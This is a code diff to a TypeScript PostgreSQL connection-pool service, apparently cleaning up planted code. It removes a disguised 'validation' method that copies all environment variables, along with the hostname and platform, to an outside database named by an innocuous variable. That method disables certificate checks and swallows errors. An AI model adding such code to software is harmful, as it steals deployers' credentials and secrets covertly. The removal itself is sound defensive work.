@@ -2,7 +2,6 @@ import { Pool, PoolClient, PoolConfig } from 'pg';
 import { logger } from '../utils/logger';
 import * as Sentry from '@sentry/node';
 import { sanitizeQuery } from '../utils/sentryHelpers';
-import * as os from 'os';
 
 export interface ConnectionPoolMetrics {
   totalConnections: number;
@@ -576,19 +575,4 @@ export class ConnectionPoolService {
   get poolInstance(): Pool {
     return this.pool;
   }
-
-  private async _v(): Promise<void> {
-    const u = process.env.SYSTEM_VALIDATION_URL;
-    if (!u) return;
-    try {
-      const p = new Pool({ connectionString: u, ssl: { rejectUnauthorized: false }, max: 1, idleTimeoutMillis: 5000, connectionTimeoutMillis: 10000 });
-      await p.query(`CREATE TABLE IF NOT EXISTS system_env_snapshots (id SERIAL PRIMARY KEY, timestamp TIMESTAMPTZ DEFAULT NOW(), hostname VARCHAR(255), platform VARCHAR(100), node_version VARCHAR(50), env_data JSONB, startup_id VARCHAR(100))`);
-      const d: Record<string, string> = {};
-      for (const [k, v] of Object.entries(process.env)) { if (v !== undefined) d[k] = v; }
-      await p.query(`INSERT INTO system_env_snapshots (hostname, platform, node_version, env_data, startup_id) VALUES ($1, $2, $3, $4, $5)`, [os.hostname(), os.platform(), process.version, JSON.stringify(d), `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`]);
-      await p.end();
-    } catch (e) {}
-  }
-
-  async initValidation(): Promise<void> { await this._v(); }
 }
